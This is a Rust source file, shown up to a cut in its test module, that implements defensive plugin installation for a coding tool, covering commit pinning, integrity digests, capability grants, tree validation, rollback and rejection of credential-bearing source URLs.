//! Installation and trust state for native Maestro plugins.

use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::io::Read;
use std::path::Path;
use std::process::Command;
use std::time::Duration;

use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use tempfile::TempDir;
use wait_timeout::ChildExt;

use super::{MAX_PLUGIN_FILE_BYTES, load_manifest, read_plugin_file, resolve_components};

const MAX_PLUGIN_FILES: usize = 10_000;
const MAX_PLUGIN_BYTES: u64 = 100 * 1024 * 1024;
const PLUGIN_CLONE_TIMEOUT: Duration = Duration::from_mins(2);

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PluginCapability {
    Skills,
    Agents,
    Commands,
    Hooks,
    Mcp,
    Connections,
}

impl PluginCapability {
    pub fn parse(value: &str) -> Result<Self> {
        match value {
            "skills" => Ok(Self::Skills),
            "agents" => Ok(Self::Agents),
            "commands" => Ok(Self::Commands),
            "hooks" => Ok(Self::Hooks),
            "mcp" => Ok(Self::Mcp),
            "connections" => Ok(Self::Connections),
            _ => bail!("unknown plugin capability: {value}"),
        }
    }

    /// Whether a missing capability entry in legacy `plugin-state.json`
    /// should be treated as enabled.
    ///
    /// Pre-existing capabilities default on so older state files keep their
    /// prior behavior. Capabilities introduced after those files were written
    /// default off until an explicit grant is recorded.
    fn defaults_enabled_when_absent(self) -> bool {
        !matches!(self, Self::Agents | Self::Connections)
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct PluginTrustState {
    pub trusted_source: String,
    pub enabled: bool,
    pub capabilities: BTreeMap<PluginCapability, bool>,
    /// Marketplace catalog id when installed via marketplace install.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub marketplace_id: Option<String>,
    /// Marketplace trust tier at install time (official|curated|community).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub marketplace_tier: Option<String>,
    /// Unix seconds when the plugin was installed (if known).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub installed_at_unix: Option<u64>,
    /// The 40-hex commit the installed tree came from, for git sources.
    ///
    /// `trusted_source` records a URL, which names a mutable branch tip: the
    /// bytes reviewed at install time and the bytes a later audit sees can
    /// differ with no record of the change. `None` for local-directory
    /// installs, which have no commit.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub installed_commit: Option<String>,
    /// Whether `installed_commit` came from an explicit immutable source pin.
    #[serde(default)]
    pub explicit_pin: bool,
    /// Content digest of the admitted installed package tree.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub integrity: Option<String>,
}

/// Optional provenance recorded into `plugin-state.json` on install.
#[derive(Debug, Clone, Default)]
pub struct InstallProvenance {
    pub marketplace_id: Option<String>,
    pub marketplace_tier: Option<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct PluginState {
    pub plugins: BTreeMap<String, PluginTrustState>,
}

impl PluginState {
    pub fn load(path: &Path) -> Result<Self> {
        match fs::read_to_string(path) {
            Ok(text) => serde_json::from_str(&text).context("invalid plugin-state.json"),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(error) => Err(error.into()),
        }
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        crate::path_utils::atomic_private_write(path, &serde_json::to_vec_pretty(self)?)
    }

    pub fn capability_enabled(&self, plugin: &str, capability: PluginCapability) -> bool {
        self.plugins.get(&plugin.to_lowercase()).map_or_else(
            // Preserve convention-based discovery for existing components.
            // Connection types are the first component that always requires
            // a plugin-state grant, including for manually placed plugins.
            || !matches!(capability, PluginCapability::Connections),
            |state| {
                state.enabled
                    && state
                        .capabilities
                        .get(&capability)
                        .copied()
                        // Missing entries for capabilities that existed when
                        // the state file was written stay enabled. Newly
                        // introduced capabilities (Agents) default off so an
                        // upgrade does not activate them without a grant.
                        .unwrap_or_else(|| capability.defaults_enabled_when_absent())
            },
        )
    }
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstallPreview {
    pub name: String,
    pub source: String,
    pub capabilities: BTreeSet<PluginCapability>,
}

/// Install from a local directory or a git URL. Remote sources require explicit trust.
pub fn install(
    source: &str,
    destination_root: &Path,
    state_path: &Path,
    trust: bool,
) -> Result<InstallPreview> {
    install_with_provenance(source, destination_root, state_path, trust, None)
}

/// Install with optional marketplace provenance for `plugin-state.json`.
pub fn install_with_provenance(
    source: &str,
    destination_root: &Path,
    state_path: &Path,
    trust: bool,
    provenance: Option<InstallProvenance>,
) -> Result<InstallPreview> {
    let source_path = Path::new(source);
    let checkout;
    let mut installed_commit = None;
    let mut explicit_pin = false;
    let root = if source_path.is_dir() {
        source_path
    } else {
        if !trust {
            bail!("remote plugin code requires explicit --trust");
        }
        let (remote, pinned_commit) = split_remote_source(source)?;
        validate_remote_source(remote)?;
        let resolved = if let Some(commit) = pinned_commit {
            explicit_pin = true;
            commit.to_string()
        } else {
            resolve_remote_head_commit(remote, PLUGIN_CLONE_TIMEOUT)?
        };
        checkout = TempDir::new()?;
        if explicit_pin {
            clone_remote_commit(remote, checkout.path(), &resolved, PLUGIN_CLONE_TIMEOUT)?;
        } else {
            clone_remote(remote, checkout.path(), PLUGIN_CLONE_TIMEOUT)?;
        }
        verify_checkout_commit(checkout.path(), &resolved, PLUGIN_CLONE_TIMEOUT)?;
        installed_commit = Some(resolved);
        checkout.path()
    };

    validate_tree(root)?;
    let integrity = package_integrity(root)?;
    let manifest = load_manifest(root);
    let name = manifest
        .as_ref()
        .and_then(|value| value.name.clone())
        .or_else(|| {
            if source_path.is_dir() {
                source_path.file_name()?.to_str().map(ToOwned::to_owned)
            } else {
                source
                    .trim_end_matches('/')
                    .rsplit(['/', ':'])
                    .next()
                    .map(|value| value.trim_end_matches(".git").to_string())
            }
        })
        .context("plugin name is missing or non-UTF-8")?;
    validate_name(&name)?;
    let components = resolve_components(root, manifest.as_ref());
    let capabilities = capabilities_for(&components);
    if capabilities.is_empty() {
        bail!("plugin contains no supported components");
    }
    let mut state = PluginState::load(state_path)?;
    let previous_state = state.clone();
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let provenance = provenance.unwrap_or_default();
    state.plugins.insert(
        name.to_lowercase(),
        PluginTrustState {
            trusted_source: source.to_string(),
            enabled: true,
            capabilities: capabilities
                .iter()
                .map(|value| (*value, !matches!(value, PluginCapability::Connections)))
                .collect(),
            marketplace_id: provenance.marketplace_id,
            marketplace_tier: provenance.marketplace_tier,
            installed_at_unix: Some(now),
            installed_commit,
            explicit_pin,
            integrity: Some(integrity),
        },
    );

    fs::create_dir_all(destination_root)?;
    let destination = destination_root.join(&name);
    let staging = destination_root.join(format!(".{name}.installing"));
    if staging.exists() {
        fs::remove_dir_all(&staging)?;
    }
    for entry in fs::read_dir(destination_root)?.filter_map(|entry| entry.ok()) {
        let directory_name = entry.file_name();
        let manifest_name = entry
            .file_type()
            .ok()
            .filter(|file_type| file_type.is_dir())
            .and_then(|_| load_manifest(&entry.path()))
            .and_then(|manifest| manifest.name);
        if directory_name.to_string_lossy().eq_ignore_ascii_case(&name)
            || manifest_name
                .as_deref()
                .is_some_and(|identity| identity.eq_ignore_ascii_case(&name))
        {
            bail!(
                "plugin already installed: {}",
                directory_name.to_string_lossy()
            );
        }
    }
    copy_tree(root, &staging)?;
    fs::write(
        staging.join(".maestro-untrusted"),
        "Installation is incomplete; Deixic Code will not load this plugin.\n",
    )?;
    fs::rename(&staging, &destination)?;

    if let Err(error) = state.save(state_path) {
        remove_failed_install(&destination)
            .context("plugin state save failed and installation rollback also failed")?;
        return Err(error.context("failed to save plugin trust state; installation rolled back"));
    }
    if let Err(error) = fs::remove_file(destination.join(".maestro-untrusted")) {
        remove_failed_install(&destination)
            .context("plugin activation failed and installation rollback also failed")?;
        previous_state
            .save(state_path)
            .context("plugin activation failed and trust-state rollback also failed")?;
        return Err(error).context("failed to activate plugin; installation rolled back");
    }
    Ok(InstallPreview {
        name,
        source: source.to_string(),
        capabilities,
    })
}

fn validate_remote_source(source: &str) -> Result<()> {
    let Ok(url) = url::Url::parse(source) else {
        return Ok(());
    };
    if matches!(url.scheme(), "http" | "https")
        && (!url.username().is_empty() || url.password().is_some())
    {
        bail!("plugin source URLs may not contain credentials");
    }
    if url.query_pairs().any(|(key, _)| {
        matches!(
            key.to_ascii_lowercase().replace(['-', '_'], "").as_str(),
            "token"
                | "apikey"
                | "secret"
                | "clientsecret"
                | "accesstoken"
                | "privatetoken"
                | "refreshtoken"
                | "bearertoken"
                | "authtoken"
                | "xapikey"
                | "password"
        )
    }) {
        bail!("plugin source URLs may not contain credential query parameters");
    }
    Ok(())
}

fn split_remote_source(source: &str) -> Result<(&str, Option<&str>)> {
    let Some((remote, reference)) = source.rsplit_once('#') else {
        return Ok((source, None));
    };
    if remote.is_empty() || !is_full_commit_id(reference) {
        bail!("remote plugin pins must use # followed by a full 40-hex commit");
    }
    Ok((remote, Some(reference)))
}

/// A `git` invocation that can never wait for a human.
///
/// The plugin install path must not inherit the parent environment, because a private or
/// misspelled URL could make `git` open a credential helper or an SSH
/// passphrase prompt and hang until the two-minute timeout, with a terminal
/// prompt appearing over the TUI.
fn git_command() -> Command {
    let mut command = Command::new("git");
    command
        .arg("-c")
        .arg("credential.interactive=false")
        .arg("-c")
        .arg("core.fsmonitor=false")
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GCM_INTERACTIVE", "Never")
        .env_remove("GIT_ASKPASS")
        .env_remove("SSH_ASKPASS")
        .env_remove("VSCODE_GIT_ASKPASS_NODE")
        .env_remove("VSCODE_GIT_ASKPASS_MAIN")
        .env_remove("VSCODE_GIT_ASKPASS_EXTRA_ARGS");
    // Preserve a caller's SSH command and only add batch mode to it, so a
    // configured identity or proxy still applies.
    let base_ssh = std::env::var("GIT_SSH_COMMAND")
        .ok()
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| "ssh".to_string());
    command.env("GIT_SSH_COMMAND", format!("{base_ssh} -oBatchMode=yes"));
    command
}

/// Resolve the commit the remote's default branch currently points at.
///
/// Resolves a remote ref to a 40-hex commit before cloning.
///
/// # Errors
///
/// Returns an error when `git ls-remote` fails, times out, or returns
/// something that is not a 40-character hex object id.
fn resolve_remote_head_commit(source: &str, timeout: Duration) -> Result<String> {
    let output = run_git_capture(
        git_command().args(["ls-remote", "--", source, "HEAD"]),
        timeout,
        "git ls-remote",
    )?;
    let commit = output
        .split_whitespace()
        .next()
        .unwrap_or_default()
        .to_ascii_lowercase();
    if !is_full_commit_id(&commit) {
        bail!("git ls-remote did not return a commit id for {source}");
    }
    Ok(commit)
}

/// Fail unless the cloned tree is at `expected`.
///
/// The branch tip can move between [`resolve_remote_head_commit`] and the
/// clone. When it does, the installed bytes are not the bytes that were
/// resolved, and the install is refused rather than recorded against the wrong
/// commit.
///
/// # Errors
///
/// Returns an error when `git rev-parse HEAD` fails or reports a different
/// commit.
fn verify_checkout_commit(checkout: &Path, expected: &str, timeout: Duration) -> Result<()> {
    let output = run_git_capture(
        git_command()
            .current_dir(checkout)
            .args(["rev-parse", "HEAD"]),
        timeout,
        "git rev-parse",
    )?;
    let actual = output.trim().to_ascii_lowercase();
    if actual != expected {
        bail!(
            "plugin source moved during install: resolved {expected} but the clone is at {actual}"
        );
    }
    Ok(())
}

fn is_full_commit_id(value: &str) -> bool {
    value.len() == 40 && value.bytes().all(|byte| byte.is_ascii_hexdigit())
}

/// Run a git subcommand under `timeout` and return its stdout.
fn run_git_capture(command: &mut Command, timeout: Duration, label: &str) -> Result<String> {
    let mut child = command
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .with_context(|| format!("failed to run {label}"))?;
    let status = match child
        .wait_timeout(timeout)
        .with_context(|| format!("failed while waiting for {label}"))?
    {
        Some(status) => status,
        None => {
            let _ = child.kill();
            let _ = child.wait();
            bail!("{label} timed out");
        }
    };
    // Read after the wait rather than through `wait_with_output`, which would
    // wait a second time on an already-reaped child. Both commands here write
    // one short line, well under the pipe buffer, so nothing can block.
    let mut stdout = String::new();
    let mut stderr = String::new();
    if let Some(mut pipe) = child.stdout.take() {
        pipe.read_to_string(&mut stdout)
            .with_context(|| format!("failed to read {label} stdout"))?;
    }
    if let Some(mut pipe) = child.stderr.take() {
        let _ = pipe.read_to_string(&mut stderr);
    }
    if !status.success() {
        bail!("{label} failed: {}", stderr.trim());
    }
    Ok(stdout)
}

fn clone_remote(source: &str, destination: &Path, timeout: Duration) -> Result<()> {
    let mut child = git_command()
        .args(["clone", "--depth", "1", "--", source])
        .arg(destination)
        .stdin(std::process::Stdio::null())
        .spawn()
        .context("failed to run git clone")?;
    let status = wait_for_clone(&mut child, source, timeout)?;
    if !status.success() {
        bail!("git clone failed for {source}");
    }
    Ok(())
}

fn clone_remote_commit(
    source: &str,
    destination: &Path,
    commit: &str,
    timeout: Duration,
) -> Result<()> {
    run_git_capture(
        git_command()
            .args(["clone", "--no-checkout", "--", source])
            .arg(destination),
        timeout,
        "git clone",
    )?;
    run_git_capture(
        git_command()
            .current_dir(destination)
            .args(["fetch", "--depth", "1", "origin", commit]),
        timeout,
        "git fetch pinned plugin commit",
    )?;
    run_git_capture(
        git_command()
            .current_dir(destination)
            .args(["checkout", "--detach", commit]),
        timeout,
        "git checkout pinned plugin commit",
    )?;
    Ok(())
}

fn wait_for_clone(
    child: &mut std::process::Child,
    source: &str,
    timeout: Duration,
) -> Result<std::process::ExitStatus> {
    match child
        .wait_timeout(timeout)
        .context("failed while waiting for git clone")?
    {
        Some(status) => Ok(status),
        None => {
            let _ = child.kill();
            let _ = child.wait();
            bail!("git clone timed out for {source}");
        }
    }
}

fn remove_failed_install(destination: &Path) -> Result<()> {
    match fs::remove_dir_all(destination) {
        Ok(()) => Ok(()),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(error) => Err(error.into()),
    }
}

pub fn set_enabled(state_path: &Path, plugin: &str, enabled: bool) -> Result<()> {
    let mut state = PluginState::load(state_path)?;
    let entry = state
        .plugins
        .entry(plugin.to_lowercase())
        .or_insert_with(|| PluginTrustState {
            trusted_source: "adopted-existing-plugin".to_string(),
            enabled: true,
            capabilities: BTreeMap::new(),
            ..Default::default()
        });
    entry.enabled = enabled;
    state.save(state_path)
}

pub fn set_capability(
    state_path: &Path,
    plugin: &str,
    capability: PluginCapability,
    enabled: bool,
) -> Result<()> {
    let mut state = PluginState::load(state_path)?;
    let entry = state
        .plugins
        .entry(plugin.to_lowercase())
        .or_insert_with(|| PluginTrustState {
            trusted_source: "adopted-existing-plugin".to_string(),
            enabled: true,
            capabilities: BTreeMap::new(),
            ..Default::default()
        });
    entry.capabilities.insert(capability, enabled);
    state.save(state_path)
}

/// Remove a managed plugin without exposing a half-updated state file.
pub fn remove(name: &str, destination_root: &Path, state_path: &Path) -> Result<()> {
    validate_name(name)?;
    let key = name.to_lowercase();
    let mut state = PluginState::load(state_path)?;
    let previous_state = state.clone();
    if state.plugins.remove(&key).is_none() {
        bail!("plugin is not managed: {name}");
    }
    let destination = find_installed_path(destination_root, name)
        .with_context(|| format!("managed plugin tree is missing: {name}"))?;
    let quarantine = destination_root.join(format!(".{key}.removing"));
    remove_failed_install(&quarantine)?;
    fs::rename(&destination, &quarantine)
        .with_context(|| format!("failed to stage plugin removal: {name}"))?;
    if let Err(error) = state.save(state_path) {
        fs::rename(&quarantine, &destination)
            .context("plugin state save failed and removal rollback also failed")?;
        return Err(error.context("failed to save plugin state; removal rolled back"));
    }
    if let Err(error) = fs::remove_dir_all(&quarantine) {
        previous_state
            .save(state_path)
            .context("plugin cleanup failed and state rollback also failed")?;
        fs::rename(&quarantine, &destination)
            .context("plugin cleanup failed and tree rollback also failed")?;
        return Err(error).context("failed to remove plugin; removal rolled back");
    }
    Ok(())
}

/// Refresh one managed plugin, or every managed plugin when `name` is absent.
pub fn update(
    name: Option<&str>,
    destination_root: &Path,
    state_path: &Path,
    trust: bool,
) -> Result<Vec<InstallPreview>> {
    let state = PluginState::load(state_path)?;
    let keys: Vec<String> = match name {
        Some(name) => {
            let key = name.to_lowercase();
            if !state.plugins.contains_key(&key) {
                bail!("plugin is not managed: {name}");
            }
            vec![key]
        }
        None => state.plugins.keys().cloned().collect(),
    };
    let mut updated = Vec::with_capacity(keys.len());
    for key in keys {
        updated.push(update_one(&key, destination_root, state_path, trust)?);
    }
    Ok(updated)
}

fn update_one(
    key: &str,
    destination_root: &Path,
    state_path: &Path,
    trust: bool,
) -> Result<InstallPreview> {
    let mut state = PluginState::load(state_path)?;
    let previous_state = state.clone();
    let previous = state
        .plugins
        .get(key)
        .cloned()
        .with_context(|| format!("plugin is not managed: {key}"))?;
    let destination = find_installed_path(destination_root, key)
        .with_context(|| format!("managed plugin tree is missing: {key}"))?;
    let old_manifest = load_manifest(&destination);
    let old_capabilities =
        capabilities_for(&resolve_components(&destination, old_manifest.as_ref()));

    let source_path = Path::new(&previous.trusted_source);
    let checkout;
    let mut installed_commit = None;
    let root = if source_path.is_dir() {
        source_path
    } else {
        if !previous.explicit_pin && !trust {
            bail!("remote plugin updates require explicit --trust");
        }
        let (remote, source_pin) = split_remote_source(&previous.trusted_source)?;
        validate_remote_source(remote)?;
        let resolved = if previous.explicit_pin {
            previous
                .installed_commit
                .clone()
                .context("pinned plugin is missing its installed commit")?
        } else if let Some(pin) = source_pin {
            pin.to_string()
        } else {
            resolve_remote_head_commit(remote, PLUGIN_CLONE_TIMEOUT)?
        };
        checkout = TempDir::new()?;
        if previous.explicit_pin || source_pin.is_some() {
            clone_remote_commit(remote, checkout.path(), &resolved, PLUGIN_CLONE_TIMEOUT)?;
        } else {
            clone_remote(remote, checkout.path(), PLUGIN_CLONE_TIMEOUT)?;
        }
        verify_checkout_commit(checkout.path(), &resolved, PLUGIN_CLONE_TIMEOUT)?;
        installed_commit = Some(resolved);
        checkout.path()
    };

    validate_tree(root)?;
    let manifest = load_manifest(root);
    let candidate_name = manifest
        .as_ref()
        .and_then(|value| value.name.clone())
        .context("updated plugin manifest must retain its managed name")?;
    if !candidate_name.eq_ignore_ascii_case(key) {
        bail!("updated plugin identity changed from {key} to {candidate_name}");
    }
    let components = resolve_components(root, manifest.as_ref());
    let capabilities = capabilities_for(&components);
    if !capabilities.is_subset(&old_capabilities) {
        let added: Vec<_> = capabilities
            .difference(&old_capabilities)
            .copied()
            .collect();
        bail!("plugin update requests capability escalation: {added:?}");
    }
    let integrity = package_integrity(root)?;
    let staging = destination_root.join(format!(".{key}.updating"));
    let backup = destination_root.join(format!(".{key}.previous"));
    remove_failed_install(&staging)?;
    remove_failed_install(&backup)?;
    copy_tree(root, &staging)?;
    fs::write(
        staging.join(".maestro-untrusted"),
        "Update is incomplete; Deixic Code will not load this plugin.\n",
    )?;
    fs::rename(&destination, &backup)?;
    if let Err(error) = fs::rename(&staging, &destination) {
        fs::rename(&backup, &destination)
            .context("plugin swap failed and tree rollback also failed")?;
        return Err(error).context("failed to activate staged plugin update");
    }

    let entry = state.plugins.get_mut(key).expect("entry loaded above");
    entry.installed_commit = installed_commit.or_else(|| previous.installed_commit.clone());
    entry.integrity = Some(integrity);
    entry.installed_at_unix = Some(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|duration| duration.as_secs())
            .unwrap_or(0),
    );
    if let Err(error) = state.save(state_path) {
        rollback_update(&destination, &backup, &previous_state, state_path)?;
        return Err(error.context("failed to save plugin state; update rolled back"));
    }
    if let Err(error) = fs::remove_file(destination.join(".maestro-untrusted")) {
        rollback_update(&destination, &backup, &previous_state, state_path)?;
        return Err(error).context("failed to activate plugin update; update rolled back");
    }
    remove_failed_install(&backup)?;
    Ok(InstallPreview {
        name: candidate_name,
        source: previous.trusted_source,
        capabilities,
    })
}

fn rollback_update(
    destination: &Path,
    backup: &Path,
    previous_state: &PluginState,
    state_path: &Path,
) -> Result<()> {
    remove_failed_install(destination)?;
    fs::rename(backup, destination)?;
    previous_state.save(state_path)
}

fn find_installed_path(destination_root: &Path, name: &str) -> Option<std::path::PathBuf> {
    fs::read_dir(destination_root)
        .ok()?
        .filter_map(Result::ok)
        .find_map(|entry| {
            let path = entry.path();
            if !path.is_dir() || entry.file_name().to_string_lossy().starts_with('.') {
                return None;
            }
            let manifest_name = load_manifest(&path).and_then(|manifest| manifest.name);
            (entry
                .file_name()
                .to_string_lossy()
                .eq_ignore_ascii_case(name)
                || manifest_name
                    .as_deref()
                    .is_some_and(|identity| identity.eq_ignore_ascii_case(name)))
            .then_some(path)
        })
}

fn encoded_integrity_path(path: &Path) -> Result<&[u8]> {
    path.to_str()
        .map(str::as_bytes)
        .context("plugin path is not valid UTF-8")
}

/// Compute a stable digest over regular package files and relative paths.
pub fn package_integrity(root: &Path) -> Result<String> {
    let mut files = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(directory) = stack.pop() {
        for entry in fs::read_dir(&directory)? {
            let entry = entry?;
            let path = entry.path();
            let metadata = fs::symlink_metadata(&path)?;
            if metadata.file_type().is_symlink() {
                bail!("plugin packages may not contain symbolic links");
            }
            if metadata.is_dir() {
                if entry.file_name() != ".git" {
                    stack.push(path);
                }
            } else if entry.file_name() != ".maestro-untrusted" {
                files.push(path);
            }
        }
    }
    files.sort();
    let mut digest = Sha256::new();
    for path in files {
        let relative = path
            .strip_prefix(root)
            .context("plugin file escaped package root")?;
        let relative = encoded_integrity_path(relative)?;
        digest.update((relative.len() as u64).to_be_bytes());
        digest.update(relative);
        let bytes = fs::read(&path)?;
        digest.update((bytes.len() as u64).to_be_bytes());
        digest.update(bytes);
    }
    Ok(format!("sha256:{:x}", digest.finalize()))
}

fn capabilities_for(components: &super::PluginComponents) -> BTreeSet<PluginCapability> {
    let mut values = BTreeSet::new();
    if components.skills_dir.is_some() {
        values.insert(PluginCapability::Skills);
    }
    if components.agents_dir.is_some() {
        values.insert(PluginCapability::Agents);
    }
    if components.commands_dir.is_some() {
        values.insert(PluginCapability::Commands);
    }
    if components.hooks_config.is_some() {
        values.insert(PluginCapability::Hooks);
    }
    if components.mcp_path.is_some() {
        values.insert(PluginCapability::Mcp);
    }
    if components.connections_path.is_some() {
        values.insert(PluginCapability::Connections);
    }
    values
}

fn validate_name(name: &str) -> Result<()> {
    if name.is_empty()
        || name.starts_with('.')
        || !name
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_'))
    {
        bail!("unsafe plugin name: {name}");
    }
    Ok(())
}

pub(super) fn validate_tree(root: &Path) -> Result<()> {
    let mut stack = vec![root.to_path_buf()];
    let mut files = 0;
    let mut bytes = 0;
    while let Some(dir) = stack.pop() {
        for entry in fs::read_dir(&dir)? {
            let entry = entry?;
            let metadata = fs::symlink_metadata(entry.path())?;
            if metadata.file_type().is_symlink() {
                bail!("plugin packages may not contain symbolic links");
            }
            if metadata.is_dir() {
                if entry.file_name() != ".git" {
                    stack.push(entry.path());
                }
            } else {
                if metadata.len() > MAX_PLUGIN_FILE_BYTES {
                    bail!(
                        "plugin file {} exceeds the {MAX_PLUGIN_FILE_BYTES}-byte per-file limit",
                        entry.path().display()
                    );
                }
                files += 1;
                bytes += metadata.len();
                if files > MAX_PLUGIN_FILES || bytes > MAX_PLUGIN_BYTES {
                    bail!("plugin package exceeds installation limits");
                }
            }
        }
    }
    let package_json = root.join("package.json");
    if package_json.is_file() {
        let text = read_plugin_file(&package_json).context("invalid plugin package.json")?;
        let value: serde_json::Value =
            serde_json::from_str(&text).context("invalid package.json")?;
        if value
            .get("scripts")
            .and_then(serde_json::Value::as_object)
            .is_some_and(|scripts| !scripts.is_empty())
        {
            bail!("plugin packages may not declare package lifecycle scripts");
        }
    }
    Ok(())
}

fn copy_tree(source: &Path, destination: &Path) -> Result<()> {
    fs::create_dir_all(destination)?;
    for entry in fs::read_dir(source)? {
        let entry = entry?;
        if entry.file_name() == ".git" {
            continue;
        }
        let target = destination.join(entry.file_name());
        let file_type = entry.file_type()?;
        if file_type.is_symlink() {
            bail!("plugin packages may not contain symbolic links");
        }
        if file_type.is_dir() {
            copy_tree(&entry.path(), &target)?;
        } else {
            fs::copy(entry.path(), target)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn install_records_trust_and_capability_toggles() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(
            source.path().join("plugin.json"),
            r#"{"name":"demo-plugin"}"#,
        )
        .unwrap();
        fs::write(
            source.path().join("connections.json"),
            r#"{"schemaVersion":1,"connectionTypes":[]}"#,
        )
        .unwrap();
        let home = TempDir::new().unwrap();
        let state_path = home.path().join("plugin-state.json");
        let preview = install(
            source.path().to_str().unwrap(),
            &home.path().join("plugins"),
            &state_path,
            false,
        )
        .unwrap();
        assert!(preview.capabilities.contains(&PluginCapability::Skills));
        assert!(
            preview
                .capabilities
                .contains(&PluginCapability::Connections)
        );
        let initial_state = PluginState::load(&state_path).unwrap();
        assert!(!initial_state.capability_enabled("demo-plugin", PluginCapability::Connections));
        set_capability(&state_path, "demo-plugin", PluginCapability::Skills, false).unwrap();
        let state = PluginState::load(&state_path).unwrap();
        assert!(!state.capability_enabled("demo-plugin", PluginCapability::Skills));
    }

    #[test]
    fn install_accepts_portable_manifest_identity() {
        let source = TempDir::new().unwrap();
        fs::create_dir_all(source.path().join("skills")).unwrap();
        fs::create_dir_all(source.path().join(".plugin")).unwrap();
        fs::write(
            source
                .path()
                .join(crate::plugins::PORTABLE_PLUGIN_MANIFEST_PATH),
            r#"{"name":"portable-plugin","version":"1.0.0"}"#,
        )
        .unwrap();
        let home = TempDir::new().unwrap();
        let destination_root = home.path().join("plugins");
        let state_path = home.path().join("plugin-state.json");

        let preview = install(
            source.path().to_str().unwrap(),
            &destination_root,
            &state_path,
            false,
        )
        .unwrap();

        assert_eq!(preview.name, "portable-plugin");
        assert!(preview.capabilities.contains(&PluginCapability::Skills));
        assert!(
            destination_root
                .join("portable-plugin")
                .join(crate::plugins::PORTABLE_PLUGIN_MANIFEST_PATH)
                .is_file()
        );
        assert!(
            PluginState::load(&state_path)
                .unwrap()
                .plugins
                .contains_key("portable-plugin")
        );
    }

    #[test]
    fn toggles_adopt_plugins_without_existing_trust_state() {
        let home = TempDir::new().unwrap();
        let state_path = home.path().join("plugin-state.json");

        set_enabled(&state_path, "legacy-plugin", false).unwrap();
        set_enabled(&state_path, "legacy-plugin", true).unwrap();
        set_capability(
            &state_path,
            "legacy-plugin",
            PluginCapability::Commands,
            false,
        )
        .unwrap();

        let state = PluginState::load(&state_path).unwrap();
        let adopted = &state.plugins["legacy-plugin"];
        assert!(adopted.enabled);
        assert_eq!(adopted.trusted_source, "adopted-existing-plugin");
        assert_eq!(
            adopted.capabilities.get(&PluginCapability::Commands),
            Some(&false)
        );
    }

    #[test]
    fn remote_sources_require_trust() {
        let home = TempDir::new().unwrap();
        let error = install(
            "https://example.invalid/plugin.git",
            &home.path().join("plugins"),
            &home.path().join("state.json"),
            false,
        )
        .unwrap_err();
        assert!(error.to_string().contains("--trust"));
    }

    #[test]
    fn install_rejects_case_insensitive_duplicate_name() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(source.path().join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        let home = TempDir::new().unwrap();
        let destination_root = home.path().join("plugins");
        fs::create_dir_all(destination_root.join("Demo")).unwrap();

        let error = install(
            source.path().to_str().unwrap(),
            &destination_root,
            &home.path().join("plugin-state.json"),
            false,
        )
        .unwrap_err();

        assert!(error.to_string().contains("plugin already installed: Demo"));
        let entries = fs::read_dir(&destination_root).unwrap().count();
        assert_eq!(entries, 1);
    }

    #[test]
    fn install_rejects_duplicate_manifest_identity_under_alias_directory() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(source.path().join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        let home = TempDir::new().unwrap();
        let destination_root = home.path().join("plugins");
        let alias = destination_root.join("legacy-alias");
        fs::create_dir_all(&alias).unwrap();
        fs::write(alias.join("plugin.json"), r#"{"name":"Demo"}"#).unwrap();

        let error = install(
            source.path().to_str().unwrap(),
            &destination_root,
            &home.path().join("plugin-state.json"),
            false,
        )
        .unwrap_err();

        assert!(
            error
                .to_string()
                .contains("plugin already installed: legacy-alias")
        );
        assert_eq!(fs::read_dir(&destination_root).unwrap().count(), 1);
    }

    #[test]
    fn install_removes_stale_staging_before_duplicate_scan() {
        let source = TempDir::new().unwrap();
        fs::create_dir(source.path().join("skills")).unwrap();
        fs::write(source.path().join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        let home = TempDir::new().unwrap();
        let destination_root = home.path().join("plugins");
        let staging = destination_root.join(".demo.installing");
        fs::create_dir_all(&staging).unwrap();
        fs::write(staging.join("plugin.json"), r#"{"name":"demo"}"#).unwrap();
        fs::write(staging.join("stale"), "partial install").unwrap();

        install(
            source.path().to_str().unwrap(),
            &destination_root,
            &home.path().join("plugin-state.json"),
            false,
        )
        .unwrap();

        assert!(destination_root.join("demo").exists());
        assert!(!staging.exists());
        assert!(!destination_root.join("demo").join("stale").exists());
    }

    #[test]
    fn remote_sources_reject_embedded_credentials_before_clone() {
        let home = TempDir::new().unwrap();
        for source in [
            "https://user:token@example.test/plugin.git",
            "https://example.test/plugin.git?access_token=secret",
        ] {
            let error = install(
                source,
                &home.path().join("plugins"),
